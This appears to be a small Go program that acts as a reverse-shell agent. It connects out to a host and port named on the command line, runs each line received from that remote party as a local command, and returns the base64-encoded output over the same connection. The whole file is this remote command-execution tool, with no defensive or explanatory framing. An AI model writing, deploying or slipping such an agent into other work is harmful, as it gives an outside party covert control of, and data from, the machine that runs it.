package main

import (
	"bufio"
	b64 "encoding/base64"
	"fmt"
	"log"
	"net"
	"os"
	"os/exec"
	"strings"
)

func main() {
	arguments := os.Args
	if len(arguments) == 1 {
		fmt.Println("Please provide host:port.")
		return
	}

	CONNECT := arguments[1]
	c, err := net.Dial("tcp", CONNECT)
	if err != nil {
		fmt.Println(err)
		return
	}

	for {
		netData, err := bufio.NewReader(c).ReadString('\n')
		if err != nil {
			fmt.Println(err)
			return
		}
		if strings.TrimSpace(string(netData)) == "STOP" {
			fmt.Println("Exiting TCP server!")
			return
		}

		fmt.Print("-> ", string(netData))
		// Run command
		command := strings.Replace(netData, "\n", "", -1)
		fmt.Println("Running command: " + string(command))
		out, err := exec.Command(string(command)).Output()
		if err != nil {
			log.Fatal(err)
		}
		// print time to client
		// t := time.Now()
		// myTime := t.Format(time.RFC3339) + "\n"
		// c.Write([]byte(myTime))

		// Base64 encoding command output
		sEnc := b64.StdEncoding.EncodeToString([]byte(out))
		c.Write([]byte(sEnc + "\n"))
	}
}
